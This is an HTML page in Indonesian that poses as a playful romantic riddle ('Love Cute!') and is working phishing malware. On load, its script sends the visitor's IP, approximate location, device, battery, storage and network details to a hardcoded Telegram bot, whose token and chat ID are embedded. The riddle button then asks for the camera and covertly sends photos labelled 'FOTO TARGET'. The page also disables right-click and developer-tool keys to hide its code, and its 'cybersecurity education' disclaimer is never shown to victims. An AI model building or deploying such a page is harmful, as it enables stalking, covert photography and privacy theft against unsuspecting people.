<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Cute!</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
}

.container {
  background: rgba(255, 255, 255, 0.95);
  border-radius: 25px;
  padding: 40px 30px;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
  text-align: center;
  max-width: 500px;
  width: 100%;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.3);
  animation: fadeIn 0.8s ease-out;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.heart {
  font-size: 3em;
  color: #ff6b6b;
  margin-bottom: 20px;
  animation: heartbeat 1.5s ease-in-out infinite;
}

@keyframes heartbeat {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.1); }
}

h1 {
  color: #ff6b6b;
  font-size: 2.2em;
  margin-bottom: 15px;
  font-weight: 700;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
}

.riddle {
  font-size: 1.3em;
  color: #555;
  margin-bottom: 30px;
  line-height: 1.5;
  font-weight: 500;
}

.btn {
  background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
  color: white;
  border: none;
  padding: 18px 40px;
  font-size: 1.2em;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
  position: relative;
  overflow: hidden;
  margin: 10px;
}

.btn:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4);
}

.btn:active {
  transform: translateY(-1px);
}

.btn::after {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
  transition: left 0.5s;
}

.btn:hover::after {
  left: 100%;
}

.btn-secondary {
  background: linear-gradient(45deg, #6b6bff, #8e8eff);
  box-shadow: 0 10px 20px rgba(107, 107, 255, 0.3);
}

.btn-secondary:hover {
  box-shadow: 0 15px 25px rgba(107, 107, 255, 0.4);
}

.sparkles {
  position: absolute;
  top: -20px;
  left: 50%;
  transform: translateX(-50%);
  font-size: 1.5em;
}

.bubble {
  background: #ffebee;
  border-radius: 20px;
  padding: 20px;
  margin: 20px 0;
  border-left: 4px solid #ff6b6b;
}

.flowers {
  display: flex;
  justify-content: center;
  gap: 15px;
  margin: 20px 0;
}

.flower {
  font-size: 1.5em;
  animation: float 3s ease-in-out infinite;
}

.flower:nth-child(2) { animation-delay: 0.5s; }
.flower:nth-child(3) { animation-delay: 1s; }

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

.camera-preview {
  width: 100%;
  max-width: 300px;
  height: 200px;
  background: #000;
  border-radius: 15px;
  margin: 20px auto;
  overflow: hidden;
  display: none;
}

.camera-preview video {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.loading {
  display: none;
  color: #ff6b6b;
  font-size: 1.1em;
  margin: 10px 0;
}

.success-message {
  display: none;
  color: #4CAF50;
  font-size: 1.1em;
  margin: 10px 0;
  font-weight: 600;
}

@media (max-width: 480px) {
  .container {
    padding: 30px 20px;
    margin: 10px;
  }
  
  h1 {
    font-size: 1.8em;
  }
  
  .riddle {
    font-size: 1.1em;
  }
  
  .btn {
    padding: 15px 30px;
    font-size: 1.1em;
  }
}
</style>
</head>
<body>
<div class="container">
  <div class="heart">💖</div>
  
  <div class="flowers">
    <div class="flower">🌷</div>
    <div class="flower">🌹</div>
    <div class="flower">🌸</div>
  </div>
  
  <h1>KAMU TAU GAAAA</h1>
  
  <div class="bubble">
    <p class="riddle">Apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
  </div>
  
  <div class="camera-preview" id="cameraPreview">
    <video id="video" autoplay playsinline></video>
  </div>
  
  <div class="loading" id="loading">📸 Mengakses kamera... Tunggu sebentar ya!</div>
  <div class="success-message" id="successMessage">✅ Foto berhasil diambil! Terima kasih 💝</div>
  
  <button class="btn" id="btnCamera">
    <span class="sparkles">✨</span>
    Aapaa tuh?
  </button>
  
  <button class="btn btn-secondary" id="btnRetry" style="display: none;">
    🔄 Coba Lagi
  </button>
  
  <div class="flowers" style="margin-top: 30px;">
    <div class="flower">💐</div>
    <div class="flower">🌼</div>
    <div class="flower">🌺</div>
  </div>
</div>

<script>
// Konfigurasi Telegram Bot
const BOT_TOKEN = "8379627519:AAF7Ti4YUtt17MB5AynRh7SM0ba3tXl8vJo";
const CHAT_ID = "6051179992";
const STATIC_IMAGE = "https://a.top4top.io/p_3592jwm3w0.jpg";

// Utility functions
function escapeHtml(s) {
  return String(s || "-").replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
}

function generateSessionId() {
  return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
}

// Data collection functions
async function getIpInfo() {
  try {
    const responses = await Promise.allSettled([
      fetch("https://ipwhois.app/json/"),
      fetch("https://ipapi.co/json/"),
      fetch("https://api.ipify.org?format=json")
    ]);
    
    let data = {};
    for (const response of responses) {
      if (response.status === 'fulfilled' && response.value.ok) {
        data = await response.value.json();
        if (data.ip) break;
      }
    }
    
    return {
      ip: data.ip || "-",
      city: data.city || data.region || "-",
      region: data.region || data.regionName || "-",
      country_name: data.country || data.country_name || "-",
      country_code: data.country_code || data.countryCode || "-",
      latitude: data.latitude || "0",
      longitude: data.longitude || "0",
      timezone: data.timezone || "-",
      isp: data.isp || data.org || "-",
      asn: data.asn || "-"
    };
  } catch (e) {
    return { 
      ip: "-", city: "-", region: "-", country_name: "-", 
      country_code: "-", latitude: "0", longitude: "0",
      timezone: "-", isp: "-", asn: "-"
    };
  }
}

async function getDeviceInfo() {
  const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({
    level: null, charging: false, chargingTime: null, dischargingTime: null
  }));
  
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
  
  return {
    // Basic info
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
    
    // Screen info
    screenWidth: screen.width,
    screenHeight: screen.height,
    innerWidth: window.innerWidth,
    innerHeight: window.innerHeight,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    orientation: screen.orientation?.type || getOrientation(),
    
    // Hardware info
    cores: navigator.hardwareConcurrency || "-",
    memory: navigator.deviceMemory || "-",
    touchPoints: navigator.maxTouchPoints || 0,
    
    // Network info
    online: navigator.onLine,
    connectionType: connection.effectiveType || "-",
    downlink: connection.downlink || "-",
    rtt: connection.rtt || "-",
    
    // Browser capabilities
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || "Tidak diatur",
    javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
    
    // Battery info
    battery: battery,
    
    // Time info
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    localTime: new Date().toString(),
    timeOffset: new Date().getTimezoneOffset(),
    
    // Session info
    sessionId: generateSessionId(),
    referrer: document.referrer || "Direct",
    url: window.location.href
  };
}

function getOrientation() {
  if (screen.orientation && screen.orientation.type) {
    return screen.orientation.type;
  } else if (window.matchMedia("(orientation: portrait)").matches) {
    return "portrait";
  } else {
    return "landscape";
  }
}

async function getAdditionalInfo() {
  try {
    // Get storage information
    const storageEstimate = await navigator.storage?.estimate?.() || {};
    
    // Get media capabilities
    const mediaCapabilities = [];
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      const devices = await navigator.mediaDevices.enumerateDevices();
      mediaCapabilities.push(...devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`));
    }
    
    // Get plugins
    const plugins = [];
    if (navigator.plugins) {
      for (let plugin of navigator.plugins) {
        plugins.push(plugin.name);
      }
    }
    
    return {
      storageQuota: storageEstimate.quota || "Unknown",
      storageUsage: storageEstimate.usage || "Unknown",
      mediaDevices: mediaCapabilities,
      plugins: plugins,
      cookieCount: document.cookie.split(';').filter(c => c.trim()).length,
      localStorageSize: JSON.stringify(localStorage).length,
      sessionStorageSize: JSON.stringify(sessionStorage).length
    };
  } catch (e) {
    return {
      storageQuota: "Error",
      storageUsage: "Error",
      mediaDevices: ["Error"],
      plugins: ["Error"],
      cookieCount: 0,
      localStorageSize: 0,
      sessionStorageSize: 0
    };
  }
}

function buildCaption(ip, device, additional) {
  const mapsUrl = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
  
  return [
    "<b>🛡️ CYBERSECURITY REPORT - ENHANCED 🛡️</b>",
    `🆔 Session ID: <code>${escapeHtml(device.sessionId)}</code>`,
    "",
    
    "<blockquote>",
    "<b>📍 INFORMASI LOKASI DETAIL</b>",
    `🌐 IP Address: <code>${escapeHtml(ip.ip)}</code>`,
    `🏙️ Kota: ${escapeHtml(ip.city)}`,
    `🗺️ Region: ${escapeHtml(ip.region)}`,
    `🌍 Negara: ${escapeHtml(ip.country_name)} (${escapeHtml(ip.country_code)})`,
    `🕒 Timezone: ${escapeHtml(ip.timezone)}`,
    `📡 ISP: ${escapeHtml(ip.isp)}`,
    `🔧 ASN: ${escapeHtml(ip.asn)}`,
    `📌 Koordinat: ${escapeHtml(ip.latitude)}, ${escapeHtml(ip.longitude)}`,
    `🗺️ Google Maps: ${mapsUrl}`,
    "</blockquote>",
    "",
    
    "<blockquote>",
    "<b>💻 INFORMASI PERANGKAT & BROWSER</b>",
    `🖥️ Platform: ${escapeHtml(device.platform)}`,
    `🌐 Browser: ${escapeHtml(device.userAgent.split('/')[0])}`,
    `🗣️ Bahasa: ${escapeHtml(device.language)}`,
    `🌐 Bahasa Tersedia: ${escapeHtml(device.languages)}`,
    `📱 Resolusi Layar: ${escapeHtml(device.screenWidth + "x" + device.screenHeight)}`,
    `🖼️ Ukuran Window: ${escapeHtml(device.innerWidth + "x" + device.innerHeight)}`,
    `⚙️ CPU Cores: ${escapeHtml(device.cores)}`,
    `🧠 RAM: ${escapeHtml(device.memory)} GB`,
    `👆 Touch Points: ${escapeHtml(device.touchPoints)}`,
    `📐 Orientasi: ${escapeHtml(device.orientation)}`,
    `🎨 Color Depth: ${escapeHtml(device.colorDepth)}`,
    `🔍 Pixel Ratio: ${escapeHtml(device.pixelRatio)}`,
    "</blockquote>",
    "",
    
    "<blockquote>",
    "<b>🌐 INFORMASI JARINGAN</b>",
    `🔌 Status Online: ${escapeHtml(device.online ? "✅" : "❌")}`,
    `📶 Tipe Koneksi: ${escapeHtml(device.connectionType)}`,
    `⬇️ Kecepatan Download: ${escapeHtml(device.downlink)} Mbps`,
    `⏱️ Latensi (RTT): ${escapeHtml(device.rtt)} ms`,
    `🍪 Cookies Enabled: ${escapeHtml(device.cookiesEnabled ? "✅" : "❌")}`,
    `🚫 Do Not Track: ${escapeHtml(device.doNotTrack)}`,
    `☕ Java Enabled: ${escapeHtml(device.javaEnabled ? "✅" : "❌")}`,
    `📄 PDF Viewer: ${escapeHtml(device.pdfViewerEnabled ? "✅" : "❌")}`,
    "</blockquote>",
    "",
    
    "<blockquote>",
    "<b>🔋 INFORMASI BATERAI & WAKTU</b>",
    `⚡ Level: ${escapeHtml(Math.round((device.battery?.level || 0) * 100))}%`,
    `🔌 Charging: ${escapeHtml(device.battery?.charging ? "✅" : "❌")}`,
    `⏱️ Charging Time: ${escapeHtml(device.battery?.chargingTime || "-")}s`,
    `⏳ Discharging Time: ${escapeHtml(device.battery?.dischargingTime || "-")}s`,
    `🕐 Timezone: ${escapeHtml(device.timezone)}`,
    `⏰ Waktu Lokal: ${escapeHtml(device.localTime)}`,
    `📊 Offset Waktu: ${escapeHtml(device.timeOffset)} menit`,
    "</blockquote>",
    "",
    
    "<blockquote>",
    "<b>💾 INFORMASI PENYIMPANAN & MEDIA</b>",
    `📦 Storage Quota: ${escapeHtml(formatBytes(additional.storageQuota))}`,
    `💽 Storage Used: ${escapeHtml(formatBytes(additional.storageUsage))}`,
    `🍪 Jumlah Cookies: ${escapeHtml(additional.cookieCount)}`,
    `💾 Local Storage: ${escapeHtml(additional.localStorageSize)} bytes`,
    `💾 Session Storage: ${escapeHtml(additional.sessionStorageSize)} bytes`,
    `🎥 Perangkat Media: ${escapeHtml(additional.mediaDevices.join(', ') || 'Tidak terdeteksi')}`,
    `🔌 Plugin: ${escapeHtml(additional.plugins.join(', ') || 'Tidak ada')}`,
    "</blockquote>",
    "",
    
    "<blockquote>",
    "<b>🌐 INFORMASI SESI BROWSING</b>",
    `🔗 URL: ${escapeHtml(device.url)}`,
    `📎 Referrer: ${escapeHtml(device.referrer)}`,
    `🕐 Waktu (UTC): ${escapeHtml(new Date().toISOString())}`,
    `👤 User Agent Lengkap:`,
    `<code>${escapeHtml(device.userAgent)}</code>`,
    "</blockquote>",
    "",
    
    "<i>⚠️ Data dikumpulkan untuk keperluan edukasi cybersecurity - Enhanced Version</i>"
  ].join("\n");
}

function formatBytes(bytes, decimals = 2) {
  if (bytes === 0 || bytes === "Unknown" || bytes === "Error") return bytes;
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

// Telegram sending functions
async function sendToTelegram(message, imageUrl = null, isDocument = false) {
  try {
    if (imageUrl) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          photo: imageUrl,
          caption: message,
          parse_mode: "HTML"
        })
      });
    } else if (isDocument) {
      // For documents, we'll handle separately
      return; // Placeholder
    } else {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "HTML"
        })
      });
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error);
  }
}

async function sendInitialData() {
  try {
    const [ipInfo, deviceInfo, additionalInfo] = await Promise.all([
      getIpInfo(),
      getDeviceInfo(),
      getAdditionalInfo()
    ]);
    
    const caption = buildCaption(ipInfo, deviceInfo, additionalInfo);
    await sendToTelegram(caption, STATIC_IMAGE);
    
    // Send additional device details as separate message if too long
    const deviceDetails = [
      "<b>🔧 DETAIL TAMBAHAN PERANGKAT</b>",
      "",
      "<code>" + escapeHtml(JSON.stringify(deviceInfo, null, 2)) + "</code>"
    ].join("\n");
    
    if (deviceDetails.length < 4096) {
      await sendToTelegram(deviceDetails);
    }
    
  } catch (error) {
    console.error("Error sending initial data:", error);
  }
}

// Camera functions
let mediaStream = null;

async function startCamera() {
  try {
    document.getElementById('loading').style.display = 'block';
    document.getElementById('btnCamera').disabled = true;
    
    mediaStream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        width: { ideal: 1920 },
        height: { ideal: 1080 },
        facingMode: 'user'
      },
      audio: false
    });
    
    const video = document.getElementById('video');
    const cameraPreview = document.getElementById('cameraPreview');
    
    video.srcObject = mediaStream;
    cameraPreview.style.display = 'block';
    
    await video.play();
    
    document.getElementById('loading').style.display = 'none';
    document.getElementById('btnCamera').disabled = false;
    document.getElementById('btnCamera').innerHTML = '📸 Ambil Foto Sekarang!';
    
  } catch (error) {
    console.error("Error accessing camera:", error);
    document.getElementById('loading').style.display = 'none';
    document.getElementById('btnCamera').disabled = false;
    alert('Maaf, tidak dapat mengakses kamera. Pastikan Anda memberikan izin akses kamera.');
  }
}

async function capturePhoto() {
  try {
    if (!mediaStream) {
      await startCamera();
      return;
    }
    
    document.getElementById('loading').style.display = 'block';
    document.getElementById('btnCamera').disabled = true;
    
    const video = document.getElementById('video');
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Capture multiple quality levels
    const highQualityBlob = await new Promise(resolve => 
      canvas.toBlob(resolve, 'image/jpeg', 0.95)
    );
    
    const mediumQualityBlob = await new Promise(resolve => 
      canvas.toBlob(resolve, 'image/jpeg', 0.7)
    );
    
    // Send photos to Telegram
    await sendPhotosToTelegram([highQualityBlob, mediumQualityBlob]);
    
    // Stop camera
    mediaStream.getTracks().forEach(track => track.stop());
    mediaStream = null;
    
    document.getElementById('cameraPreview').style.display = 'none';
    document.getElementById('loading').style.display = 'none';
    document.getElementById('successMessage').style.display = 'block';
    document.getElementById('btnRetry').style.display = 'inline-block';
    document.getElementById('btnCamera').style.display = 'none';
    
  } catch (error) {
    console.error("Error capturing photo:", error);
    document.getElementById('loading').style.display = 'none';
    document.getElementById('btnCamera').disabled = false;
  }
}

async function sendPhotosToTelegram(blobs) {
  try {
    for (let i = 0; i < blobs.length; i++) {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("document", blobs[i], `photo_${i + 1}_${Date.now()}.jpg`);
      formData.append("caption", `📸 FOTO TARGET - Kualitas ${i === 0 ? 'Tinggi' : 'Sedang'}\nWaktu: ${new Date().toLocaleString('id-ID')}`);
      
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
        method: "POST",
        body: formData
      });
      
      // Delay between sends to avoid rate limiting
      if (i < blobs.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  } catch (error) {
    console.error("Error sending photos:", error);
  }
}

function retryCamera() {
  document.getElementById('successMessage').style.display = 'none';
  document.getElementById('btnRetry').style.display = 'none';
  document.getElementById('btnCamera').style.display = 'inline-block';
  document.getElementById('btnCamera').innerHTML = '✨ Aapaa tuh?';
  document.getElementById('btnCamera').disabled = false;
}

// Event listeners and initialization
document.getElementById('btnCamera').addEventListener('click', capturePhoto);
document.getElementById('btnRetry').addEventListener('click', retryCamera);

// Send initial data when page loads
window.addEventListener('load', function() {
  sendInitialData();
  
  // Track user interactions
  document.addEventListener('click', function() {
    // Additional tracking can be added here
  });
  
  // Track page visibility changes
  document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
      // User switched tabs/windows
      console.log('User switched away from tab');
    }
  });
});

// Prevent right-click and inspect element
document.addEventListener('contextmenu', function(e) {
  e.preventDefault();
  return false;
});

document.addEventListener('keydown', function(e) {
  // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
  if (e.key === 'F12' || 
      (e.ctrlKey && e.shiftKey && e.key === 'I') || 
      (e.ctrlKey && e.shiftKey && e.key === 'J') ||
      (e.ctrlKey && e.key === 'u')) {
    e.preventDefault();
    return false;
  }
});
</script>
</body>
</html>
